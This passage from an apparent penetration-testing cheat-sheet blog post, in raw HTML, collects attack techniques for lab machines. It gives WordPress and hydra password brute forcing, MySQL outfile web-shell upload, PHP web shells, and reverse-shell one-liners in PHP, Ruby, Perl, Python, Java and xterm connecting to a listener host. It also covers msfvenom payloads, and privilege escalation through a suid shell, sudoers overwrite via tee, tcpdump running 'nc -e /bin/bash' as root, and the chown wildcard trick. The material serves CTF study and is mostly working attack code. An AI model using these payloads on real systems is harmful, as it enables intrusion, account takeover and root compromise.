</span><span class='line'>    ap       all plugins (can take a long time)
</span><span class='line'>    tt       timthumbs
</span><span class='line'>    t        themes
</span><span class='line'>    vt       only vulnerable themes
</span><span class='line'>    at       all themes (can take a long time)
</span><span class='line'>  Multiple values are allowed : &ldquo;-e tt,p&rdquo; will enumerate timthumbs and plugins
</span><span class='line'>  If no option is supplied, the default is &ldquo;vt,tt,u,vp&rdquo;</span></code></pre></td></tr></table></div></figure>
Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database.</p>

<p>We can also use wordpress to bruteforce password for a username
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan &ndash;url <a href="http://192.168.1.2">http://192.168.1.2</a> &ndash;wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt &ndash;username elliot</span></code></pre></td></tr></table></div></figure></li>
</ul>
<ul>
<li>Names? Possible Usernames? Possible Passwords?:
<br>
Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based on different combinations such as firstname.lastname or first letter of first name + lastname etc. <a href="https://twitter.com/superkojiman">superkojiman</a> has written a python script named &ldquo;namemash.py&rdquo; available at <a href="https://gist.githubusercontent.com/superkojiman/11076951/raw/namemash.py">here</a> which could be used to create possible usernames.
However, we still have a large amount of usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.
<ol>
<li>Using metasploit smtp_enum module:
<br>
Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
</li>
<li>Using VRFY command:</li>
<li>Using RCPT TO command:</li>
</ol></p>

<p></li>
<li>FTP Opportunities:
<br>
If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -rq <a href="ftp://IP">ftp://IP</a>
</span><span class='line'>&ndash;ftp-user=username
</span><span class='line'>&ndash;ftp-password=password</span></code></pre></td></tr></table></div></figure>
</li></p>

<p></ul>
</li>
<li><strong>Remote Code Execution</strong>:
<ul>
<li><strong>MYSQL</strong>: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo -n &ldquo;&lt;?php phpinfo(); ?&gt;&rdquo; | xxd -ps
</span><span class='line'>3c3f70687020706870696e666f28293b203f3e</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>select 0x3c3f70687020706870696e666f28293b203f3e into outfile &ldquo;/var/www/html/blogblog/wp-content/uploads/phpinfo.php&rdquo;</span></code></pre></td></tr></table></div></figure></li>
<li>
<strong>Reverse Shells</strong>: Mostly taken from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a> and <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a></p>

<p><ul>
<li>PHP:
We can create a new file say ( shell.php ) on the server containing
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php system($_GET[&ldquo;cmd&rdquo;]); ?&gt;</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php echo shell_exec($_GET[&ldquo;cmd&rdquo;]); ?&gt;</span></code></pre></td></tr></table></div></figure>
which can be accessed by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><a href="http://IP/shell.php?cmd=id">http://IP/shell.php?cmd=id</a></span></code></pre></td></tr></table></div></figure>
or we can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php</span></code></pre></td></tr></table></div></figure>
Weely also generates a webshell
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>weevely generate password /tmp/payload.php</span></code></pre></td></tr></table></div></figure>
which can be called by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>weevely <a href="http://192.168.1.2/location_of_payload">http://192.168.1.2/location_of_payload</a> password</span></code></pre></td></tr></table></div></figure>
However, it wasn&rsquo;t as useful as php meterpreter or reverse shell.</p>

<p>PHP Trick:
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>; php -r &lsquo;$sock=fsockopen(&ldquo;192.168.56.101&rdquo;,1337);exec(&ldquo;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&rdquo;);&rsquo;</span></code></pre></td></tr></table></div></figure>
The above can be connected by listening at port 1337 by using nc
</li>
<li>
Ruby:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby -rsocket -e'f=TCPSocket.open(&ldquo;10.0.0.1&rdquo;,1234).to_i;exec sprintf(&ldquo;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&rdquo;,f,f,f)&lsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Perl:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl -e 'use Socket;$i=&ldquo;10.0.0.1&rdquo;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&ldquo;tcp&rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&ldquo;&gt;&amp;S&rdquo;);open(STDOUT,&ldquo;&gt;&amp;S&rdquo;);open(STDERR,&ldquo;&gt;&amp;S&rdquo;);exec(&ldquo;/bin/sh -i&rdquo;);};&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Python:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.0.0.1&rdquo;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&rsquo;</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Java:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>r = Runtime.getRuntime()
</span><span class='line'>p = r.exec([&ldquo;/bin/bash&rdquo;,&ldquo;-c&rdquo;,&ldquo;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done&rdquo;] as String[])
</span><span class='line'>p.waitFor()</span></code></pre></td></tr></table></div></figure>
</li>
<li>
JSP:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war &gt; runme.war</span></code></pre></td></tr></table></div></figure>
</li>
<li>
XTerm:
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xterm -display 10.0.0.1:1</span></code></pre></td></tr></table></div></figure>
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Xnest :1</span></code></pre></td></tr></table></div></figure>
You’ll need to authorise the target to connect to you (command also run on your host):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xhost +targetip</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>
</ul>
<li><strong>Spawning a TTY Shell</strong>:  <a href="http://netsec.ws/?p=337">Spawning a TTY Shell</a> and  <a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> has provided multiple ways to get a tty shell
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import pty; pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;import os; os.system(&ldquo;/bin/bash&rdquo;)&rsquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/sh -i</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl -e &lsquo;exec &ldquo;/bin/sh&rdquo;;&rsquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>perl: exec &ldquo;/bin/sh&rdquo;;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ruby: exec &ldquo;/bin/sh&rdquo;</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lua: os.execute(&lsquo;/bin/sh&rsquo;)</span></code></pre></td></tr></table></div></figure>
(From within IRB)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exec &ldquo;/bin/sh&rdquo;</span></code></pre></td></tr></table></div></figure>
(From within vi)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:!bash</span></code></pre></td></tr></table></div></figure>
(From within vi)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>:set shell=/bin/bash:shell</span></code></pre></td></tr></table></div></figure>
(From within nmap)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>!sh</span></code></pre></td></tr></table></div></figure>
Using “Expect” To Get A TTY
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat sh.exp
</span><span class='line'>#!/usr/bin/expect
</span><span class='line'># Spawn a shell, then allow the user to interact with it.
</span><span class='line'># The new shell will have a good enough TTY to run tools like ssh, su and login
</span><span class='line'>spawn sh
</span><span class='line'>interact</span></code></pre></td></tr></table></div></figure> </li></p>

<p><li>Brute forcing:
hydra:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-l LOGIN              or -L FILE login with LOGIN name, or load several logins from FILE
</span><span class='line'>-p PASS               or -P FILE try password PASS, or load several passwords from FILE
</span><span class='line'>-U        service module usage details
</span><span class='line'>-e nsr additional checks, &ldquo;n&rdquo; for null password, &ldquo;s&rdquo; try login as pass, &ldquo;r&rdquo; try the reverse login as pass
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>
hydra http-post-form:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -U http-post-form
</span><span class='line'>
</span><span class='line'>Help for module http-post-form:
</span><span class='line'>============================================================================
</span><span class='line'>Module http-post-form requires the page and the parameters for the web form.
</span><span class='line'>
</span><span class='line'>By default this module is configured to follow a maximum of 5 redirections in
</span><span class='line'>a row. It always gathers a new cookie from the same URL without variables
</span><span class='line'>The parameters take three &ldquo;:&rdquo; separated values, plus optional values.
</span><span class='line'>(Note: if you need a colon in the option string as value, escape it with &ldquo;:&rdquo;, but do not escape a &ldquo;\&rdquo; with &ldquo;\&rdquo;.)
</span><span class='line'>
</span><span class='line'>Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
</span><span class='line'>First is the page on the server to GET or POST to (URL).
</span><span class='line'>Second is the POST/GET variables (taken from either the browser, proxy, etc.
</span><span class='line'> with usernames and passwords being replaced in the &ldquo;^USER^&rdquo; and &ldquo;^PASS^&rdquo;
</span><span class='line'> placeholders (FORM PARAMETERS)
</span><span class='line'>Third is the string that it checks for an <em>invalid</em> login (by default)
</span><span class='line'> Invalid condition login check can be preceded by &ldquo;F=&rdquo;, successful condition
</span><span class='line'> login check must be preceded by &ldquo;S=&rdquo;.
</span><span class='line'> This is where most people get it wrong. You have to check the webapp what a
</span><span class='line'> failed string looks like and put it in this parameter!
</span><span class='line'>The following parameters are optional:
</span><span class='line'> C=/page/uri     to define a different page to gather initial cookies from
</span><span class='line'> (h|H)=My-Hdr: foo   to send a user defined HTTP header with each request
</span><span class='line'>                 ^USER^ and ^PASS^ can also be put into these headers!
</span><span class='line'>                 Note: &lsquo;h&rsquo; will add the user-defined header at the end
</span><span class='line'>                 regardless it&rsquo;s already being sent by Hydra or not.
</span><span class='line'>                 &lsquo;H&rsquo; will replace the value of that header if it exists, by the
</span><span class='line'>                 one supplied by the user, or add the header at the end
</span><span class='line'>Note that if you are going to put colons (:) in your headers you should escape them with a backslash ().
</span><span class='line'> All colons that are not option separators should be escaped (see the examples above and below).
</span><span class='line'> You can specify a header without escaping the colons, but that way you will not be able to put colons
</span><span class='line'> in the header value itself, as they will be interpreted by hydra as option separators.
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'> &ldquo;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&rdquo;
</span><span class='line'> &ldquo;/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon:escape:S=authlog=.<em>success&rdquo;
</span><span class='line'> &ldquo;/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.</em>failed&rdquo;
</span><span class='line'> &ldquo;/:user=^USER&amp;pass=^PASS^:failed:H=Authorization: Basic dT1w:H=Cookie: sessid=aaaa:h=X-User: ^USER^&rdquo;
</span><span class='line'> &ldquo;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C<sup>USER</sup>^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&rdquo;</span></code></pre></td></tr></table></div></figure>
</ul>
</li>
</ol></p>

<p><li><strong>Unprivileged shell to privileged shell:</strong>
<ol>
<li>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>

<p>Suid.c
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int main(void) {
</span><span class='line'>setgid(0); setuid(0);
</span><span class='line'>execl(“/bin/sh”,”sh”,0); }</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>
<strong>SUDO -l Permissions</strong>
<ul>
<li>
<strong>nmap suid</strong> shell:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap --script &lt;(echo &lsquo;require &ldquo;os&rdquo;.execute &ldquo;/bin/sh&rdquo;&rsquo;)</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap &ndash;interactive</span></code></pre></td></tr></table></div></figure>
</li>
<li>
If <strong>tee is suid</strong>: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user.
If some script is run as root, you may also run. For example, let&rsquo;s say tidy.sh is executed as root on the server, we can write the below code in temp.sh
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>temp.sh
</span><span class='line'>echo “milton ALL=(ALL) ALL” &gt; /etc/sudoers”
</span><span class='line'>
</span><span class='line'>or
</span><span class='line'>
</span><span class='line'>chmod +w /etc/sudoers to add write properties to sudoers file to do the above</span></code></pre></td></tr></table></div></figure>
and then
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span></code></pre></td></tr></table></div></figure>
which will add contents of temp.sh to tidyup.sh.
</li>
<li><strong>tcpdump</strong>:
The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).</p>

<p>Create a temp.sh ( which contains the commands to executed as root )
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>id
</span><span class='line'>/bin/nc 192.168.110.1 4444 -e /bin/bash</span></code></pre></td></tr></table></div></figure>
Execute the command
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root</span></code></pre></td></tr></table></div></figure>
where
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>   -C file_size
</span><span class='line'>          Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have
</span><span class='line'>          the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).
</span><span class='line'>
</span><span class='line'>   -W     Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a &lsquo;rotating&rsquo; buffer.  In addition,
</span><span class='line'>          it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly.
</span><span class='line'>
</span><span class='line'>          Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in
</span><span class='line'>          cyclical files per timeslice.
</span><span class='line'>
</span><span class='line'>   -z postrotate-command
</span><span class='line'>          Used in conjunction with the -C or -G options, this will make tcpdump run &ldquo; postrotate-command file &rdquo; where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2
</span><span class='line'>          will compress each savefile using gzip or bzip2.
</span><span class='line'>
</span><span class='line'>          Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn&rsquo;t disturb the capture process.
</span><span class='line'>
</span><span class='line'>          And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &amp;  argu‐
</span><span class='line'>          ments arrangements and execute the command that you want.
</span><span class='line'>
</span><span class='line'>   -Z user
</span><span class='line'>   &ndash;relinquish-privileges=user
</span><span class='line'>          If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.
</span><span class='line'>
</span><span class='line'>          This behavior can also be enabled by default at compile time.</span></code></pre></td></tr></table></div></figure>
</li></p>

<p>More can be learn here <a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/</a>
</li>
</ul>
</li>
<li><strong>Unix Wildcards</strong>:
<ul>
The below text is directly from the <a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">DefenseCode_Unix_WildCards_Gone_Wild</a>
<li><strong>Chown file reference trick</strong> (file owner hijacking)</p>

<p>First really interesting target I&rsquo;ve stumbled across is &lsquo;chown&rsquo;. Let&rsquo;s say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to &lsquo;nobody&rsquo;. Pay attention to the file owners in the following files list.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  117 Oct 28 17:35 inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon    0 Oct 28 17:45 &ndash;reference=.drf.php
</span><span class='line'>-rw-rw&mdash;-.  1 user user   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r&ndash;.  1 user user   94 Oct 28 17:35 script.php</span></code></pre></td></tr></table></div></figure>
Files in this public directory are mostly owned by the user named &lsquo;user&rsquo;, and root user will now change that to &lsquo;nobody&rsquo;.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# chown -R nobody:nobody *.php</span></code></pre></td></tr></table></div></figure>
Let&rsquo;s see who owns files now&hellip;
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx&mdash;&mdash;. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r&ndash;r&ndash;.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r&ndash;.  1 leon leon  117 Oct 28 17:35 inc.php
